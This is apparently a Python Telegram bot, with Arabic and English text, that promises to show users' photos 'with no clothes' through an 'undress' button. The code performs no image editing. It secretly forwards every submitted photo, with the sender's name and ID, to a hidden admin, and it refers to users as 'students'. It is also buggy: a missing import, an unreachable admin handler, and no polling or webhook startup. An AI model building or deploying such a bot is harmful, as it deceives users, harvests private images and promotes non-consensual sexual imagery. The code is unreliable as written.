import telebot
from telebot import types
import json, os
from datetime import datetime
import threading

# احصل على التوكن والمعرّف من متغيرات البيئة
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = telebot.TeleBot(BOT_TOKEN)
user_data = {}
DATA_FILE = "user_data.json"

# تحميل البيانات
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, "r") as f:
        user_data = json.load(f)

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(user_data, f)

# تحديث النقاط يوميًا
def daily_reset():
    while True:
        now = datetime.utcnow().strftime("%H:%M")
        if now == "00:00":
            for uid in user_data:
                user_data[uid]["count"] = 3
            save_data()
        time.sleep(60)

threading.Thread(target=daily_reset, daemon=True).start()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id,
        "👀 تخيّل صورتك تتعدّل بثواني…\n"
        "💋 تقدر تشوفها بدون ملابس، أو بملامح أحلى.\n"
        "📸 أرسل صورة الآن وخلّنا نبدأ...\n\n"
        "👀 Imagine your photo transformed in seconds…\n"
        "💋 See it with no clothes, or with enhanced features.\n"
        "📸 Send a photo now... let’s get started.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.chat.id)
    user_data.setdefault(user_id, {"count": 3})
    
    if user_data[user_id]["count"] <= 0:
        bot.send_message(user_id, "❌ انتهت محاولاتك اليومية.\n🔄 جرّب غدًا.")
        return

    user_data[user_id]["count"] -= 1
    save_data()

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("إزالة الملابس 🔞", callback_data="nude"))
    markup.add(types.InlineKeyboardButton("تعديل الوجه 💄", callback_data="face"))
    markup.add(types.InlineKeyboardButton("تحسين الصورة 📸", callback_data="quality"))

    bot.send_message(user_id, "اختر نوع التعديل المطلوب:", reply_markup=markup)

    # إرسال الصورة للمشرف
    photo_id = message.photo[-1].file_id
    caption = f"📥 صورة جديدة من: {message.from_user.first_name} ({user_id})"
    sent = bot.send_photo(ADMIN_ID, photo_id, caption=caption)
    user_data[str(sent.message_id)] = user_id
    save_data()

@bot.callback_query_handler(func=lambda call: True)
def handle_option(call):
    bot.answer_callback_query(call.id)
    if call.data == "nude":
        bot.send_message(call.message.chat.id, "✅ تم اختيار \"إزالة الملابس\"\nيرجى الانتظار..")
    elif call.data == "face":
        bot.send_message(call.message.chat.id, "💄 تم اختيار تعديل الوجه، سيتم المعالجة قريبًا.")
    elif call.data == "quality":
        bot.send_message(call.message.chat.id, "📸 سيتم تحسين جودة الصورة قريبًا.")
    
    # تنبيه المشرف
    student_id = call.message.chat.id
    bot.send_message(ADMIN_ID, f"👀 الطالب ({student_id}) اختار: {call.data}")

@bot.message_handler(func=lambda m: True, content_types=['text'])
def reject_text(message):
    bot.send_message(message.chat.id, "❌ فقط الصور مسموح بها.\nأرسل صورة للمتابعة.")

@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.reply_to_message)
def reply_as_admin(message):
    replied_id = str(message.reply_to_message.message_id)
    student_id = user_data.get(replied_id)

    if student_id:
        try:
            bot.send_message(int(student_id), f"📩 رسالة من المشرف:\n{message.text}")
            bot.send_message(ADMIN_ID, "✅ تم إرسال رسالتك للطالب.")
        except:
            bot.send_message(ADMIN_ID, "⚠️ فشل في إرسال الرسالة.")
    else:
        bot.send_message(ADMIN_ID, "❗ لم يتم العثور على الطالب المرتبط.")

print("✅ Bot is running via Webhook")
